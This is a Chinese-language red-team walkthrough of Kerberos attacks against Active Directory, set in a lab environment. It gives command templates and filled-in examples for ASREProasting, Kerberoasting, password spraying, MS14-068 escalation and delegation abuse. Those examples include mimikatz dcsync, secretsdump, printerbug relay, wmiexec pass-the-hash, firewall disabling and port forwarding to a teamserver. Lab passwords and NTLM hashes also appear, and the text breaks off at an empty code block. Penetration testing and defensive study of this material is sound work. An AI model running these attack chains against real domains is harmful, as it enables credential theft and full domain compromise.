# Kerberos攻击面

## 环境准备

### 防火墙策略

| 接口 |       IP       |      说明      |
| :--: | :------------: | :------------: |
| WAN  | 192.168.25.80  |      公网      |
| LAN  | 172.10.255.254 | 攻击者家庭内网 |
| OPT1 |  10.10.10.254  |  企业域控网段  |
| OPT2 |  10.10.80.254  | 企业服务器网段 |
| OPT3 | 10.10.255.254  |  企业办公网段  |

![firewall](../../images/AD/Kerberos/firewall-1.png)

![firewall](../../images/AD/Kerberos/firewall-2.png)

![firewall](../../images/AD/Kerberos/firewall-3.png)

![firewall](../../images/AD/Kerberos/firewall-4.png)

### 域 - redteam.com

![redteam](../../images/AD/Kerberos/redteam.jpg)

#### 机器信息

|  机器名称   |         OS          |       IP       |       描述       |
| :---------: | :-----------------: | :------------: | :--------------: |
|     DC      | Windows Server 2016 |   10.10.10.1   |       域控       |
| MSSQLSERVER | Windows Server 2016 |   10.10.80.1   |   MSSQL服务器    |
| HTTPSERVER  | Windows Server 2016 |   10.10.80.2   |    HTTP服务器    |
|     PC      |     Windows 10      |  10.10.255.1   | 办公终端（被控） |
|             |       pfSense       |                |      防火墙      |
|             |      Centos 7       | 192.168.25.132 | teamserver服务器 |
|             |     Windows 10      |  172.10.255.1  |    攻击者终端    |

#### 账号信息

|         角色         |    用户名     |      密码      |            权限             |           配置           |
| :------------------: | :-----------: | :------------: | :-------------------------: | :----------------------: |
|     域管理员账号     | Administrator |    1qaz@WSX    |                             |   敏感用户不能不被委派   |
|   PC本地管理员账号   |    pcadmin    |  pcadmin@123   |                             |                          |
| 服务器本地管理员账号 | Administrator |  pcadmin@123   |                             |                          |
|        域账号        |    worker     |   worker@123   |                             | 不使用Kerberos预身份认证 |
|        域账号        |  addpcadmin   | addpcadmin@123 |       把机器添加到域        | 不使用Kerberos预身份认证 |
|        域账号        |  allpcadmin   | allpcadmin@123 |   Account Operators用户组   | 不使用Kerberos预身份认证 |
|     SPN服务账号      |  mssqladmin   | mssqladmin@123 | 具备SPN读写权限；非约束委派 |                          |
|     SPN机器账号      |  MSSQLSERVER  |                |         非约束委派          |                          |
|     SPN服务账号      |   httpadmin   | httpadmin@123  |          约束委派           |                          |
|     SPN机器账号      |  HTTPSERVER   |                |          约束委派           |                          |

### 域 - apt.com

![apt](../../images/AD/Kerberos/apt.jpg)

#### 机器信息

|   机器名称   |           OS           |       IP       |       描述       |
| :----------: | :--------------------: | :------------: | :--------------: |
|  DC-MASTER   | Windows Server 2008 R2 |   10.10.10.2   |      主域控      |
| DC-AUXILIARY | Windows Server 2008 R2 |   10.10.10.3   |      辅域控      |
|      PC      |       Windows 7        |  10.10.255.2   | 办公终端（被控） |
|              |        pfSense         |                |      防火墙      |
|              |        Centos 7        | 192.168.25.132 | teamserver服务器 |
|              |       Windows 10       |  172.10.255.1  |    攻击者终端    |

#### 账号信息

|      角色      |    用户名     |    密码     | 权限 | 配置 |
| :------------: | :-----------: | :---------: | :--: | :--: |
|  域管理员账号  | Administrator |  1qaz@WSX   |      |      |
|     域账号     |    worker     | worker@123  |      |      |
| 本地管理员账号 |    pcadmin    | pcadmin@123 |      |      |

## 获取域用户

### ASREProasting

#### 利用条件 - 存在关闭**预身份认证**的用户

![asrep](../../images/AD/Kerberos/asrep-cnd-1.png)

#### 前期准备- 查找关闭预身份认证的账号

##### 使用PowerView查找

```shell
# 模板
powershell-import <PowerView.ps1在攻击机的绝对路径>
powerpick Get-DomainUser -PreauthNotRequired # 查询关闭Pre-Auth的账号
# 示例
powershell-import PowerView.ps1
powerpick Get-DomainUser -PreauthNotRequired
```

![asrep](../../images/AD/Kerberos/asrep-info-1.png)

##### 使用SharpView查找

```shell
# 模板
execute-assembly <SharpView.exe在攻击机的绝对路径> Get-DomainUser -PreauthNotRequired
# 示例
execute-assembly SharpView.exe Get-DomainUser -PreauthNotRequired
```

![asrep](../../images/AD/Kerberos/asrep-info-2.png)

##### 使用ldapdomaindump查找

```shell
# 模板
proxychains python3 ldapdomaindump -u <域名>\\<账号> -p <密码> <域控服务器IP>
grep DONT_REQ_PREAUTH domain_users.grep # 查询关闭Pre-Auth的账号
# 示例
proxychains ldapdomaindump -u redteam.com\\worker -p worker@123 10.10.10.1
grep DONT_REQ_PREAUTH domain_users.grep
```

![asrep](../../images/AD/Kerberos/asrep-info-3.png)

#### 攻击方式

##### 获取ASREPHash

###### 使用ASREPRoast获取

> 注意

- 在asrephash.txt文件中的`$krb5asrep`后拼接`$23`字符串

> 攻击方法

```shell
# 模板
powershell-import <ASREPRoast.ps1在攻击机的绝对路径>
powerpick Get-ASREPHash -UserName <没有开启预身份认证的用户名>|Out-File -Encoding ASCII asrephash.txt
# 示例
powershell-import ASREPRoast.ps1
powerpick Get-ASREPHash -UserName worker|Out-File -Encoding ASCII asrephash.txt
```

![asrep](../../images/AD/Kerberos/asrep-att-1.png)

###### 使用Rubeus获取

- 获取所有用户的ASREPHash

```shell
# 模板
execute-assembly <Rubeus.exe在攻击机的绝对路径> asreproast /format:hashcat /outfile:asrephash.txt
# 示例
execute-assembly Rubeus.exe asreproast /format:hashcat /outfile:asrephash.txt
```

![asrep](../../images/AD/Kerberos/asrep-att-3.png)

###### 使用GetNPUsers获取

> 利用条件

- 拥有域账号密码

> 攻击方法

```shell
# 模板
proxychains python3 GetNPUsers.py -request <域名/域账号:密码> -format hashcat -outputfile asrephash.txt
# 示例
proxychains python3 GetNPUsers.py -request redteam.com/worker:worker@123 -format hashcat -outputfile asrephash.txt
```

![asrep](../../images/AD/Kerberos/asrep-att-4.png)

##### 使用hashcat破解ASREPHash

- 使用字典破解

```shell
hashcat.exe -m 18200 asrephash.txt password.dict -O --force
```

![asrep](../../images/AD/Kerberos/asrep-att-5.png)

- 使用未知密码破解

```shell
# 破解8位未知密码
hashcat.exe -m 18200 -a 3 asrephash.txt ?a?a?a?a?a?a?a?a -O --force
```

### Kerberoasting

#### 前期准备 - 破解账号选择

|   SPN账号类型    |                             分析                             |
| :--------------: | :----------------------------------------------------------: |
| 服务账号（推荐） | 密码由用户控制，定期修改，可能会使用**弱口令**，并且为了不影响业务，密码长期不修改 |
|     机器账号     |             密码由机器随机生成，并且30天更换一次             |

#### 攻击方式

##### 获取SPN账号HASH

###### 使用Invoke-Kerberoast获取

```shell
# 模板
powershell-import <Invoke-Kerberoast.ps1在攻击机的绝对路径>
powerpick Invoke-Kerberoast -OutputFormat Hashcat|Select hash|ConvertTo-CSV -NoTypeInformation > hash.csv
# 示例
powershell-import Invoke-Kerberoast.ps1
powerpick Invoke-Kerberoast -OutputFormat Hashcat|Select hash|ConvertTo-CSV -NoTypeInformation > hash.csv
```

![kerb](../../images/AD/Kerberos/kerb-att-1.png)

###### 使用Rubeus获取

```shell
# 模板
execute-assembly <Rubeus.exe在攻击机的绝对路径> kerberoast /outfile:hash.txt
# 示例
execute-assembly Rubeus.exe kerberoast /outfile:hash.txt
```

![kerb](../../images/AD/Kerberos/kerb-att-2.png)

###### 使用GetUserSPNs获取

```shell
# 模板
proxychains python3 GetUserSPNs.py <域名/域账号:密码> -request -outputfile hash.txt
# 示例
proxychains python3 GetUserSPNs.py redteam.com/worker:worker@123 -request -outputfile hash.txt
```

![kerb](../../images/AD/Kerberos/kerb-att-3.png)

##### 使用hashcat破解SPN账户的HASH

- 使用字典破解

```shell
hashcat.exe -m 13100 hash.txt password.dict -O --force
```

![kerb](../../images/AD/Kerberos/kerb-att-4.png)

- 使用未知密码破解

```shell
# 破解8位未知密码
hashcat.exe -m 13100 -a 3 hash.txt ?a?a?a?a?a?a?a?a -O --force
```

### 域账号枚举和密码爆破

#### 域账号枚举

##### 使用nmap枚举域账号

```shell
# 模板
proxychains nmap -sT -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='<域名>',userdb=<用户名字典>" <域控服务器IP>
# 示例
proxychains nmap -sT -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='redteam.com',userdb=username.dict" 10.10.10.1
```

![enum](../../images/AD/Kerberos/enum-username-att-1.png)

##### 使用kerbrute枚举域账号

> 利用条件

- 本地存在ldap服务

> 攻击方法

- 方法一：使用Proxifier代理在攻击机运行kerbrute
- 方法二：把kerbrute工具上传到靶机执行（推荐，速度较快）

```shell
# 模板
kerbrute_windows_386.exe userenum -d <目标域名> <username.dict>
# 示例
kerbrute_windows_386.exe userenum -d redteam.com username.dict
```

![enum](../../images/AD/Kerberos/enum-username-att-2.png)

#### 密码爆破

##### 使用smartbrute进行爆破

###### 使用字典爆破

```shell
# 模板
proxychains python3 smartbrute.py brute -bU <用户名字典> -bP <密码字典> kerberos -d <域名> -p tcp
# 示例
proxychains python3 smartbrute.py brute -bU username.dict -bP password.dict kerberos -d redteam.com -p tcp
```

![enum](../../images/AD/Kerberos/enum-password-att-1.png)

###### 自动获取域内用户爆破

> 利用条件

- 需要一个域账号密码

> 攻击方法

```shell
# 模板
proxychains python3 smartbrute.py smart -bP <密码字典> ntlm -d <域名> -u <域账号> -p <密码> kerberos -p tcp
# 示例
proxychains python3 smartbrute.py smart -bP password.dict ntlm -d redteam.com -u worker -p worker@123 kerberos -p tcp
```

![enum](../../images/AD/Kerberos/enum-password-att-2.png)

##### 使用kerbrute爆破

> 利用条件

- 本地存在ldap服务

> 攻击方法

- 方法一：使用Proxifier代理在攻击机运行kerbrute
- 方法二：把kerbrute工具上传到靶机执行（推荐，速度较快）

###### 密码喷洒

```shell
# 模板
kerbrute_windows_386.exe passwordspray -d <目标域名> <username.list> <固定密码>
# 示例
kerbrute_windows_386.exe passwordspray -d redteam.com username.dict 1qaz@WSX
```

![enum](../../images/AD/Kerberos/enum-password-att-3.png)

###### 字典枚举

```shell
# 模板
kerbrute_windows_386.exe bruteuser -d <目标域名> password.dict <需要爆破的用户名>
# 示例
kerbrute_windows_386.exe bruteuser -d redteam.com password.dict addpcadmin
```

![enum](../../images/AD/Kerberos/enum-password-att-4.png)

## 提升域用户权限

### MS14-068

| PrimaryGroupId | 用户组             |
| -------------- | ------------------ |
| 513            | 域用户             |
| 512            | 域管理员           |
| 518            | 架构管理员         |
| 519            | 企业管理员         |
| 520            | 组策略创建者所有者 |

#### 影响范围

| 主版本                   | 细项版本                                    | 停止服务 |
| ------------------------ | -------------------------------------------- | -------- |
| Windows Server 2003      | SP2, x64 Edition SP2, sp2 for Itanium-based Systems | 已停止   |
| Windows Vista            | SP2, x64 Edition SP2                         | 已停止   |
| Windows Server 2008      | x86 SP2, x64 SP2, Itanium-based Systems SP2   | 已停止   |
| Windows 7                | x86 SP1, x64 SP1                              | 已停止   |
| Windows Server 2008 R2   | x64 SP1, Itanium-based Systems SP1            | 已停止   |
| Windows 8                | x86, x64                                     | 已停止   |
| Windows 8.1              | x86, x64                                     |    |
| Windows Server 2012      |                                            |    |
| Windows Server 2012 R2   |                                            |          |

#### 攻击方式

##### 使用goldenPac获取域控权限

```shell
# 模板
proxychains python3 goldenPac.py <域名>/<域用户>:<密码>@<域控服务器域名> -dc-ip <域控服务器IP> -target-ip <目标域控服务器IP>
# 示例
proxychains python3 goldenPac.py apt.com/worker:worker@123@DC-MASTER.apt.com -dc-ip 10.10.10.3 -target-ip 10.10.10.2
```

![ms14068](../../images/AD/Kerberos/ms14068-1.png)

##### 使用kekeo获取域控权限

1. 使用kekeo申请票据

```shell
# 模板
kekeo.exe "exploit::ms14068 /domain:<域名> /user:<用户名> /password:<密码> /ptt" "exit"
# 示例
kekeo.exe "exploit::ms14068 /domain:apt.com /user:worker /password:worker@123 /ptt" "exit"
```

![ms14068](../../images/AD/Kerberos/ms14068-2.png)

2. 测试是否提权成功

```shell
# 模板
dir \\<域控服务器域名>\C$
# 示例
dir \\DC-MASTER.apt.com\C$
```

![ms14068](../../images/AD/Kerberos/ms14068-3.png)

##### 使用mimikatz获取域控权限

1. 查看当前用户的**SID**

```shell
whoami /user
```

![ms14068](../../images/AD/Kerberos/ms14068-4.png)

2. 使用**MS14-068**的EXP对目标域账户进行提权

```shell
# 模板
MS14-068.exe -u <用户名@域名> -p <密码> -s <用户SID> -d <域控服务器域名>
# 示例
MS14-068.exe -u worker@apt.com -p worker@123 -s S-1-5-21-3242658189-3096440536-400316682-1106 -d DC-MASTER.apt.com
```

![ms14068](../../images/AD/Kerberos/ms14068-5.png)

3. 使用**mimikatz**导入票据

```shell
# 模板
mimikatz kerberos::purge
mimikatz kerberos::ptc <TGT票据绝对路径>
# 示例
mimikatz kerberos::purge
mimikatz kerberos::ptc TGT_worker@apt.com.ccache
```

![ms14068](../../images/AD/Kerberos/ms14068-6.png)

4. 测试是否提权成功

```shell
# 模板
dir \\<域控服务器域名>\C$
# 示例
dir \\DC-MASTER.apt.com\C$
```

![ms14068](../../images/AD/Kerberos/ms14068-7.png)

### 委派

#### 非约束委派

##### 前期准备 - 查找非约束委派账号

###### 使用AdFind查找

- 查找SPN服务账号

```shell
# 模板
AdFind.exe -b "DC=<域名>,DC=<域名>" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
# 示例
AdFind.exe -b "DC=redteam,DC=com" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
```

![ud](../../images/AD/Kerberos/ud-info-1.png)

- 查找SPN机器账号

```shell
# 模板
AdFind.exe -b "DC=<域名>,DC=<域名>" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
# 示例
AdFind.exe -b "DC=redteam,DC=com" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
```

![ud](../../images/AD/Kerberos/ud-info-2.png)

###### 使用PowerView查找

- 查找SPN机器账号

```shell
# 模板
powershell-import PowerView.ps1
powerpick Get-NetComputer -Unconstrained -Domain <域名>
# 示例
powershell-import PowerView.ps1
powerpick Get-NetComputer -Unconstrained -Domain redteam.com
```

![ud](../../images/AD/Kerberos/ud-info-3.png)

###### 使用ldapdomaindump查找

- 条件：拥有域账号密码

```shell
# 模板
proxychains python3 ldapdomaindump -u <域名>\\<账号> -p <密码> <域控服务器IP>
grep TRUSTED_FOR_DELEGATION domain_users.grep # 查找SPN服务账号
grep TRUSTED_FOR_DELEGATION domain_computers.grep # 查找SPN机器账号
# 示例
proxychains ldapdomaindump -u redteam.com\\worker -p worker@123 10.10.10.1
grep TRUSTED_FOR_DELEGATION domain_users.grep
grep TRUSTED_FOR_DELEGATION domain_computers.grep
```

![ud](../../images/AD/Kerberos/ud-info-4.png)

###### 使用findDelegation查找

- 条件：拥有域账号密码

```shell
# 模板
proxychains python3 findDelegation.py <域名>/<账号>:<密码>|grep Unconstrained
# 示例
proxychains python3 findDelegation.py redteam.com/worker:worker@123|grep Unconstrained
```

![ud](../../images/AD/Kerberos/ud-info-5.png)

##### 攻击方式

###### Kerberos Relay

> 利用条件

- 拥有SPN账号密码

- 拥有被控端的管理员权限

- SPN账号具备读取和写入SPN权限

![ud](../../images/AD/Kerberos/ud-att-1.png)

> 前期准备

1. 关闭被控端的防火墙

```shell
netsh advfirewall set allprofiles state off
```

![ud](../../images/AD/Kerberos/ud-att-2.png)

2. 使用**管理员**权限开启**SMB端口**转发

```shell
# 模板
PortBender redirect 445 <自定义端口>
rportfwd <自定义端口> <teamserver服务器IP> <teamserver服务器监听SMB协议的端口>
# 示例
PortBender redirect 445 8445
rportfwd 8445 192.168.25.132 445
```

![ud](../../images/AD/Kerberos/ud-att-3.png)

> 攻击方法

1. 使SPN域名解析到被控服务器

   1. 添加一个新的SPN域名

   ```shell
   # 模板
   proxychains python3 addspn.py -u <域名>\\<SPN用户> -p <密码> -s HOST/<SPN域名> ldap://<域控IP>
   # 示例
   proxychains python3 addspn.py -u redteam.com\\mssqladmin -p mssqladmin@123 -s HOST/relayx.redteam.com ldap://10.10.10.1
   ```

   ![ud](../../images/AD/Kerberos/ud-att-4.png)

   2. 使用**dnstool**添加一条DNS解析记录，把SPN的域名解析到被控终端（PS：由于proxychains无法传输udp协议数据，所以需要上传dnstool到被控端）

   ```shell
   # 模板
   proxychains python3 dnstool.py -u <域名>\<域用户> -p <密码> -r <自定义SPN域名> -a add -d <被控终端IP> <域控IP> --tcp
   # 示例
   proxychains python3 dnstool.py -u redteam.com\\worker -p worker@123 -r relayx.redteam.com -a add -d 10.10.255.1 10.10.10.1 --tcp
   ```

   ![ud](../../images/AD/Kerberos/ud-att-5.png)

2. 获取**域控TGT票据**

   1. 开启**krbrelayx**监听

   ```shell
   # 模板
   proxychains python3 krbrelayx.py -p <SPN账号的密码> -s <域名>
   # 示例
   proxychains python3 krbrelayx.py -p mssqladmin@123 -s redteam.com
   ```

   ![ud](../../images/AD/Kerberos/ud-att-6.png)

   2. 触发**强制认证漏洞**，获取**TGT票据**（PS：这里使用打印机漏洞**printerbug**触发）

   ```shell
   # 模板
   proxychains python3 printerbug.py <域名>/<SPN用户名>:<密码>@<辅域控IP> <自定义的SPN域名>
   # 示例
   proxychains python3 printerbug.py redteam.com/mssqladmin:mssqladmin@123@10.10.10.1 relayx.redteam.com
   ```

   ![ud](../../images/AD/Kerberos/ud-att-7.png)![ud](../../images/AD/Kerberos/ud-att-8.png)


3. 获取**域管理员HASH**

   1. 在**hosts**添加DNS解析记录

   ```ini
   # 模板
   <域控服务器域名>	<域控服务器IP>
   <域名>	<域控服务器IP>
   # 示例
   DC.redteam.com	10.10.10.1
   redteam.com	10.10.10.1
   ```

   ![ud](../../images/AD/Kerberos/ud-att-9.png)

   2. 使用**secretsdump**获取域**管理员HASH**

   ```shell
   # 模板
   KRB5CCNAME=<TGT票据> proxychains python3 secretsdump.py -no-pass -k <域控服务器域名> -just-dc-user <域管理员账号> -just-dc-ntlm
   # 示例
   KRB5CCNAME=DC\$\@REDTEAM.COM_krbtgt\@REDTEAM.COM.ccache proxychains python3 secretsdump.py -no-pass -k DC.redteam.com -just-dc-user administrator -just-dc-ntlm
   ```

   ![ud](../../images/AD/Kerberos/ud-att-10.png)

4. 使用**exec工具**远程控制域控服务器（PS：这里使用**wmiexec**）

```shell
# 模板
proxychains python3 wmiexec.py -hashes <NTLM HASH> <域名>/<域管理员用户名>@<域控服务器IP> -no-pass
# 示例
proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 redteam.com/administrator@DC.redteam.com -no-pass
```

![ud](../../images/AD/Kerberos/ud-att-11.png)

###### Rubues中继

> 利用条件

- 获取被控端管理员权限

- 被控端为SPN服务器

> 攻击方法

- 关闭被控端防火墙

```shell
netsh advfirewall set allprofiles state off
```

- 使用**Rubeus**每隔2秒监听一次获取**TGT票据**

```shell
# 模板
execute-assembly <Rubeus.exe在攻击机的绝对路径> monitor /interval:2 /filteruser:<域控服务器名称>
# 示例
execute-assembly Rubeus.exe monitor /interval:2 /filteruser:DC$
```

![ud](../../images/AD/Kerberos/ud-att-12.png)

- 以**域用户**身份使用**SpoolSample**触发强制认证

```shell
# 模板
execute-assembly <SpoolSample.exe在攻击机的绝对路径> <域控服务器名称> <SPN机器账号>
# 示例
execute-assembly SpoolSample.exe DC MSSQLSERVER
```

![ud](../../images/AD/Kerberos/ud-att-13.png)

- 使用Rubues导入TGT票据

```shell
# 模板
execute-assembly <Rubeus.exe在攻击机的绝对路径> ptt /ticket:<TGT票据的base64字符串>
# 示例
execute-assembly Rubeus.exe ptt /ticket:doIE8jCCBO6gAwIBBaEDAgEWooID/zCCA/thggP3MIID86ADAgEFoQ0bC1JFRFRFQU0uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtSRURURUFNLkNPTaOCA7kwggO1oAMCARKhAwIBAqKCA6cEggOjPgUrO9AbhFOrs9O8xCnNeTSSTruzEwamJCBG0M5ilepzEZ1GaJerloEJnuU0ABNn8aFfd4/nHQdp12b3fzFGo3SjM91jgV1hksMdrVlSTrgYQUyFv1UBi2VRjmrWt8qZIqOx8Hd3w6FPGqqvLz30yXyPieoGtkS9ERoycVXpxFGCZi6WeWiw4nWNoSrQx6eor3w2FZlVAJfDg1VUBrqkLmck6lS2jihFF35XJzESIc7aafjmn2Ob7rsCeQLudOuuCZzWqOLPXN4zky63r2RCF1HyYb7e96HCSHg5KK0sa2woRVYrwOOzi90kLhOnQ5Avxr3HrgAlv+OaHO9BZ62MSj4vxWHmOd6zODK/nmn17x7oPNo3kB8QqPqkJdWAISziGGSrnPd6PsFyvX69keZjM8AbaonTtJxvA0OhFG7RiTQqmZAsXPlUYGa5IIU9f/qoVRqetFRX/m9i/PovYfE8m0slwx51h+xjKsny/2CaVBdz0JVgYoa4JA6W43n6218Xg90UfN0tV7t8m8I2Ln4yYtKOQd/3i1NPBsUDPiKsPZ0FxTS8VcIv7xQngTwbJRqe8Up7+51bPvuXRtB9CXOFzArAolyQ89C21xQCsKypcQhTi24GCL49oWNs9d84vbkFuuLJw14HLBHp4rAiV+zujz0K4cRhPR6hKL1lYxqNVA8f3RtKDPDd3LQKdgfZuqIAjbGrhXotS/C0K7HMnjR6Q1rhNIvPOJrBQzu/bD9ZvaJCpYUWVe7yM+FLfa9Cn6NXlMF7h9iGfp8hOLwdnkzw0TsPivZQsLqtvUE28yUTPRvnT2gzj/TGr3ct/O6XBRfC5cg4b2lURJspvnEZ5mDZYhp6lqkWaxsNnE+a5vC3J9pSfLSxwR2XLyqVBNfZwPgJQ4wmuA75kuFQ+gkZQhunm0AEnzseJU6hFLedj73vT8F35yrjYfWC+Mh5CHUhW99gpJQoJHwx6xfqHHeGLYrvLGSy67W9Z/UXUVW+Ej/Q30beeizjS1VCp8l+cy1SBPoVB4VYXUXIJ47fTOy6/MTfk59rKeT21kXn9KnbcOXFePgTyQogk7TLso4bLiIq2mYeOZjK2Teri0B4gv+WTomBVHPvoESDWQFcFRwVRS2NHXIm8hfPXjv5O31olF3YPaO1OWn0FaljEBNe3LRP2bUIgxsLD1Gnw3L2MOHqfYkU9IAhB728jM0yGmvZTduVpBcP8JY1YtxVbNuGq/v30V7zeexFdKOB3jCB26ADAgEAooHTBIHQfYHNMIHKoIHHMIHEMIHBoCswKaADAgESoSIEIG0Eb8+f889Gs5AcytVsUrv4+ZmA6kwq8kjQ9XlcZV/0oQ0bC1JFRFRFQU0uQ09NohAwDqADAgEBoQcwBRsDREMkowcDBQBgoQAApREYDzIwMjMxMDE2MDYyMjI2WqYRGA8yMDIzMTAxNjE2MjIyNlqnERgPMjAyMzEwMjMwNjIyMjZaqA0bC1JFRFRFQU0uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtSRURURUFNLkNPTQ==
```

![ud](../../images/AD/Kerberos/ud-att-14.png)

- 使用mimikatz导出域管理员HASH

```shell
# 模板
mimikatz lsadump::dcsync /domain:<域名> /user:<域名NETBIOS>\<域用户名>
# 示例
mimikatz lsadump::dcsync /domain:redteam.com /user:REDTEAM\Administrator
```

![ud](../../images/AD/Kerberos/ud-att-15.png)

- 使用exec工具远控域控

```shell
# 模板
proxychains python3 wmiexec.py -hashes <NTLM HASH> <域名>/<域管理员用户名>@<域控服务器IP> -no-pass
# 示例
proxychains python3 wmiexec.py -hashes :161cff084477fe596a5db81874498a24 redteam.com/administrator@DC.redteam.com -no-pass
```

![ud](../../images/AD/Kerberos/ud-att-16.png)


#### 约束委派

##### 利用条件

- 获取SPN服务器的Administrator权限

##### 前期准备  - 查找约束委派账号

###### 使用AdFind查找

- 查找SPN服务账号

```shell
# 模板
AdFind.exe -b "DC=<域名>,DC=<域名>" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
# 示例
AdFind.exe -b "DC=redteam,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
```

![cd](../../images/AD/Kerberos/cd-info-1.png)

- 查找机器账号

```shell
# 模板
AdFind.exe -b "DC=<域名>,DC=<域名>" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
# 示例
AdFind.exe -b "DC=redteam,DC=com" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
```

![cd](../../images/AD/Kerberos/cd-info-2.png)

###### 使用PowerView查找

- 查找SPN服务账号

```shell
# 模板
powershell-import PowerView.ps1
powerpick Get-DomainUser –TrustedToAuth -domain <域名> -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl
# 示例
powershell-import PowerView.ps1
powerpick Get-DomainUser –TrustedToAuth -domain redteam.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl
```

![cd](../../images/AD/Kerberos/cd-info-3.png)

- 查找机器账号

```shell
# 模板
powershell-import PowerView.ps1
powerpick Get-DomainComputer -TrustedToAuth -domain <域名> -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize
# 示例
powershell-import PowerView.ps1
powerpick Get-DomainComputer -TrustedToAuth -domain redteam.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize
```

![cd](../../images/AD/Kerberos/cd-info-4.png)

###### 使用ldapdomaindump查找

- 条件：拥有域账号密码

```shell
# 模板
proxychains python3 ldapdomaindump -u <域名>\\<账号> -p <密码> <域控服务器IP>
grep TRUSTED_TO_AUTH_FOR_DELEGATION domain_users.grep # 查找SPN服务账号
grep TRUSTED_TO_AUTH_FOR_DELEGATION domain_computers.grep # 查找SPN机器账号
# 示例
proxychains ldapdomaindump -u redteam.com\\worker -p worker@123 10.10.10.1
grep TRUSTED_TO_AUTH_FOR_DELEGATION domain_users.grep
grep TRUSTED_TO_AUTH_FOR_DELEGATION domain_computers.grep
```

![cd](../../images/AD/Kerberos/cd-info-5.png)

###### 使用findDelegation查找

- 条件：拥有域账号密码

```shell
# 模板
proxychains python3 findDelegation.py <域名>/<账号>:<密码>
# 示例
proxychains python3 findDelegation.py redteam.com/worker:worker@123|grep Constrained
```

![cd](../../images/AD/Kerberos/cd-info-6.png)

##### 攻击方式

###### 使用SPN机器账号的HASH

> 利用条件

- 拥有机器的管理员权限

> 攻击方法

1. 获取SPN机器账号的HASH

```shell
mimikatz privilege::debug
mimikatz sekurlsa::logonpasswords
```

![cd](../../images/AD/Kerberos/cd-att-1.png)

2. 使用SPN机器账号的HASH申请ST票据

```shell
# 模板
## 使用-force-forwardable即利用CVE-2020-1704漏洞强制生成可转发的票据
proxychains python3 getST.py -dc-ip <域控服务器IP> -spn <约束委派的服务> -impersonate administrator <域名>/<机器账号> -hashes :<机器账号HASH> -force-forwardable
# 示例
proxychains python3 getST.py -dc-ip 10.10.10.1 -spn CIFS/DC.redteam.com -impersonate administrator redteam.com/HTTPSERVER$ -hashes :2ab4a4ebad3f05cf35ca6b97c68dc238 -force-forwardable
```

![cd](../../images/AD/Kerberos/cd-att-2.png)

3. 使用exec工具远程连接域控服务器

```shell
# 模板
KRB5CCNAME=<ST票据> proxychains python3 wmiexec.py -k <域名>/<域管理员账号>@<被委派的机器域名> -no-pass -dc-ip <域控服务器IP>
# 示例
KRB5CCNAME=administrator.ccache proxychains python3 wmiexec.py -k redteam.com/administrator@DC.redteam.com -no-pass -dc-ip 10.10.10.1
```

![cd](../../images/AD/Kerberos/cd-att-3.png)

#### 基于资源的约束委派

##### 利用条件 - 拥有基于资源的约束委派相关权限账号的密码

- 情况一：账号拥有加入域的机器
- 情况二：账号属于Account Operators用户组

##### 前期准备 - 查找基于资源的约束委派账号

###### 反向查找 - 查询将机器加入域的用户

> 利用条件

- 需要获取一个域用户的密码

> 攻击方法

- 使用AdFind查找具有mS-DS-CreatorSID属性的账号

```shell
# 模板
AdFind.exe -h <域控服务器IP> -u <域账号> -up <密码> -b "DC=<域名>,DC=<域名>" -f "objectClass=computer" mS-DS-CreatorSID
# 示例
AdFind.exe -h 10.10.10.1 -u worker -up worker@123 -b "DC=redteam,DC=com" -f "objectClass=computer" mS-DS-CreatorSID
```

![rbcd](../../images/AD/Kerberos/rbcd-info-1.png)

- 查询SID对应的用户名

  - 使用powershell查询

  ```shell
  # 模板
  powerpick $objSID = New-Object System.Security.Principal.SecurityIdentifier <SID>;$objUser = $objSID.Translate([System.Security.Principal.NTAccount]);$objUser.Value
  # 示例
  powerpick $objSID = New-Object System.Security.Principal.SecurityIdentifier S-1-5-21-2481340254-715925007-1998582121-1105;$objUser = $objSID.Translate([System.Security.Principal.NTAccount]);$objUser.Value
  ```

  ![rbcd](../../images/AD/Kerberos/rbcd-info-2.png)

  - 使用ldapdomaindump查询

  ```shell
  # 模板
  proxychains python3 ldapdomaindump -u <域名>\\<账号> -p <密码> <域控服务器IP>
  grep <SID> domain_users.grep
  # 示例
  proxychains ldapdomaindump -u redteam.com\\worker -p worker@123 10.10.10.1
  grep S-1-5-21-2481340254-715925007-1998582121-1105 domain_users.grep
  ```

  ![rbcd](../../images/AD/Kerberos/rbcd-info-3.png)

###### 正向查找 - 查询当前用户把哪些机器加入域

- 查看当前用户的SID

```shell
whoami /user
```

![rbcd](../../images/AD/Kerberos/rbcd-info-4.png)

- 使用powershell查找当前用户对哪些机器具备GeneriCall或WriteProperty等修改权限

```shell
# 模板
powershell-import PowerView.ps1
powerpick Get-DomainObjectAcl | ?{$_.SecurityIdentifier -match '<SID>'} | select objectdn,activedirectoryrights
# 示例
powershell-import PowerView.ps1
powerpick Get-DomainObjectAcl | ?{$_.SecurityIdentifier -match 'S-1-5-21-2481340254-715925007-1998582121-1105'} | select objectdn,activedirectoryrights
```

![rbcd](../../images/AD/Kerberos/rbcd-info-5.png)

##### 攻击方式

###### 通过管理主机加入域的用户拿下主机

- 使用addcomputer创建机器账号

```shell
# 模板
